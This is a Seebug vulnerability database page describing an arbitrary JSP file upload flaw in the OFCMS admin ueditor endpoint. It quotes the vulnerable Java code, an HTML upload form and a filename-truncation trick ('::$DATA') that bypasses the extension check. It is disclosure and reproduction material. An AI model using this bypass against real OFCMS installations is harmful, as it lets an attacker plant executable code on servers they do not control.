=== Content from www.seebug.org_9de43095_20250120_234327.html ===

![Seebug](/static/dist2/images/weixin-share-sm.jpg)

[![Knownsec-logo](/static/dist2/images/knownsec-logo.png)](https://www.knownsec.com?from=seebug_logo)
![](/static/dist2/images/line.png)
[![Seebug-logo](/static/dist2/images/seebug-logo2023.png?v=2)](/)

* [Index](/)
* [Submit Vulnerability](/contribute/vul)
* [Rank](/hackers)
* Market
  + [Exchange](/exchange/goods)
  + [Newest PoC](/vuldb/vulnerabilities?has_poc=true)
* [Search](/search/)* Community
    + [Pocsuite](http://pocsuite.org/)
    + [Ceye.io](http://ceye.io/)
    + [Paper](http://paper.seebug.org/)
    + [KCon](http://kcon.knownsec.com/)
    + [ZoomEye](https://www.zoomeye.org/)
  * About
    + [Data Statistics](/stat)
    + [Vul Market](/help/about)
    + [Develop Document](https://pocsuite.org/guide/what-is-pocsuite3.html)
    + [Guideline](/help/user_level)
    + [Feedback](/help/feedback)
    + [Help](/help/reward)

* [Login](/accounts/login/?next=/vuldb/ssvid-97831)
* [Register](/accounts/register?next=/vuldb/ssvid-97831)

Toggle navigation

* [Login](/accounts/login/?next=/vuldb/ssvid-97831)
* [Index](/)
* Reward and Rank
  + [Detail Reward List](/vuldb/reward/detail)
  + [PoC Reward List](/vuldb/reward/poc)
  + [Exchange](/exchange/goods)
  + [Rank](/hackers)
  + [Submit New Vulnerability](/contribute/vul)
* Vulnerability Database
  + [Vulnerability List](/vuldb/vulnerabilities)
  + [Component Categories](/appdir/)
  + [Vulnerability Category](/category/)
* [Search](/search/)
* [Data Statistics](/stat)
* [Paper](http://paper.seebug.org/)

# OFCMS background ueditor uploadFile file upload vulnerability

 Follow
0

### Basic Fields

SSV ID:
[SSV-97831](/help/vul#ssv)

Find Time:
2019-03-06

Submit Time:
2019-03-06

Level:

Category:
[文件上传](/category/upload-files)

Component:
[OFCMS](/appdir/OFCMS)

Author:
Unknown

Submitter:
anonymous

CVE-ID：
Add

CNNVD-ID：
Add

CNVD-ID：
Add

ZoomEye Dork：
Add

### Source

### Detail

Contributor
anonymous
Got  0KB

### OFCMS background ueditor uploadFile file upload vulnerability
#### Vulnerability Introduction
OFCMS is a content management system based on Java technology. Functions: column template customization, content model customization, multiple site management, online template page editing and other functions. The code is completely open source, MIT license agreement.
#### Vulnerability impact
- < v1.1.3
#### Vulnerability analysis
The vulnerability trigger point is the `uploadFile` method in the `com/ofsoft/cms/admin/controller/UeditorAction.java` file.
```java
@Clear
public void uploadFile() {
try {
UploadFile file = this.getFile("file", "file");
file.getFile().createNewFile();
Map<String, Object> msg = new HashMap<String, Object>();
Map<String, Object> data = new HashMap<String, Object>();
msg.put("url", "/upload/file/" + file.getFileName());
msg.put("title", file.getFileName());
msg.put("state", "SUCCESS");
msg.put("original", file.getFileName());
rendJson(msg);
} catch (Exception e) {
rendFailedJson(ErrorCode.get("9999"));
}
}
```
The upload file is processed by the getFile function. During the period, the uploaded file contents and file types are not checked and filtered. At the end, the file name is detected.
```java
private boolean isSafeFile(UploadFile uploadFile) {
String fileName = uploadFile.getFileName().trim().toLowerCase();
if (!fileName.endsWith(".jsp") && !fileName.endsWith(".jspx")) {
return true;
} else {
uploadFile.getFile().delete();
return false;
}
}
```
It can be seen that the uploaded file name is not allowed to end with jsp and jspx, but here can be bypassed, bypassing this judgment can successfully upload jsp file.
#### Recurring environment
- Windows
- Tomcat 8.0.43
#### Vulnerability recurrence
1. Login to the background
2. Construct a form upload file
```html
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>upload file</title>
</head>
<body>
<form action="http://192.168.245.1:8080/admin/ueditor/uploadFile" method="POST" enctype="multipart/form-data">
<input type="file" name="file">
<input type="text" name="p" value="comn/upload.html">
<input type="submit" name="submit" value="上传文件">
</form>
</body>
</html>
```
3. Upload the file, use Burpsuite to intercept, and modify the file name. On the Windows platform:: $DATA for truncation, under Linux platform can be used > truncation (not tested).
![](https://images.seebug.org/1551861251577-w331s)
Can see the return is successful
![](https://images.seebug.org/1551861259620-w331s)
Under the /upload/file/ directory
![](https://images.seebug.org/1551861270421-w331s)
![Loading icon](/static/dist2/bower_components/loading/loading-bars.svg)

have 0  exchange

### PoC

Unavailable PoC

### Reference Linking

* <https://www.seebug.org/>

### Solutions

**Temp Solutions**

Unavailable Temp Solutions

**Official Solution**

Unavailable Official solution

**Defense Solutions**

Unavailable Defense Solutions

Improve Solutions

BackSubmit

[![](/media/banner/2017/08/22/150338358279.png)](https://www.yunaq.com/)

[![](/media/banner/2020/05/26/159048249988.png)](https://www.yunaq.com/help/article?id=5ebcf0e3439fa500115a1326?from=seebugb00515)

[![](/media/banner/2017/08/09/150226089416.png)](https://scanv.yunaq.com/stcs/index.html?from=seebugb00526)

[![](/media/banner/2020/01/16/157914493733.png)](https://www.yunaq.com/dbzx?from=seebugb00115)

---

### Timeline

* 2019-03-06
  发现/披露了漏洞
* ![anonymous](/static/dist2/images/avatar.png)
  anonymous

  2019-03-06
  提交了漏洞
* ![anonymous](/static/dist2/images/avatar.png)
  anonymous

  2019-03-06
  提交补充了漏洞详情
* ![anonymous](/static/dist2/images/avatar.png)
  anonymous

  2019-03-06
  补充了漏洞详情

---

### Related Vuls

* [OFCMS background role management storage type XSS](/vuldb/ssvid-97849)
* [OFCMS background website basic settings storage type XSS](/vuldb/ssvid-97848)
* [OFCMS background site management storage type XSS](/vuldb/ssvid-97847)
* [OFCMS background site announcement storage type XSS](/vuldb/ssvid-97846)
* [OFCMS background column management storage type XSS](/vuldb/ssvid-97845)
* [OFCMS background Advertising management storage type XSS](/vuldb/ssvid-97844)
* [OFCMS background theme management storage type XSS](/vuldb/ssvid-97843)
* [OFCMS background Friendly link management storage type XSS](/vuldb/ssvid-97842)
* [OFCMS background single page management storage type XSS](/vuldb/ssvid-97841)
* [OFCMS background form management storage type XSS](/vuldb/ssvid-97840)

 Follow
0

Popularity
3606

0

![](/static/images/anonymous.jpg)
##### Need to bind phone before comment. [Bind Now](https://sso.telnet404.com/accounts/bind_phone/)

Submit Comment

 anonymous reply

#### Unavailable Comments

※Any content provided by this site, only to learn the code and services, not for illegal purposes

captcha![]()

OK
Back

×
#### Hello,

您的会员可兑换次数还剩：
次

本次兑换将消耗 1 次

Vulnerabilities

* [Vulnerability List](/vuldb/vulnerabilities)
* [Component Categories](/appdir/)
* [Vulnerability Category](/category/)

More

* [Reward List](/vuldb/reward/poc)
* [Rank](/hackers)

Help

* [About](/help/about)
* [Relevant Instructions](/help/user_level)
* [Vulnerability Definition](/help/vul)
* [Reward Plan](/help/reward)

Contact

* 010-57076191
* s1@seebug.org
* 15th Floor, Unit A, Tower 3, Wangjing SOHO, Fu'an West Road, Chaoyang District, Beijing 100102, P.R.China

Public links

* [Knownsec](https://www.knownsec.com/#/)
* [yunaq](https://www.yunaq.com/cyd/?from=cj_cyd_sbug)
* [创宇蜜罐-诱捕溯源](https://mg.yunaq.com/#/?from=seebuglink)
* [ScanV](https://www.scanv.com/?from=seebug)
* [hackernews](http://hackernews.cc/)

Follow Us

[![](https://aqyzmedia.yunaq.com/labels/label_sm_90040.png)](https://v.yunaq.com/certificate?domain=www.seebug.org&from=label)

[![](/static/dist2/images/ksz-kcon-new.svg)](http://kcon.knownsec.com/)

[![](/static/dist2/images/seebug-logo2023.png)](/)

[![](/static/dist2/images/ksz-zoomeye.svg)](https://www.zoomeye.org/)

[![](/static/dist2/images/yunaq-logo.png)](https://www.yunaq.com/?from=sbg0702)

[京ICP备10040895号](https://beian.miit.gov.cn/)
[![](/static/dist2/images/beian.png)
京公网安备 11010502034610号](http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=11010502034610)
Copyright @ 404 Team from Knownsec.
[简体中文](/accounts/language/?l=zh-cn)

×
#### Hello,

please call the customer service hotline to recharge, thank you for your continued support Seebug!

 010-57076191


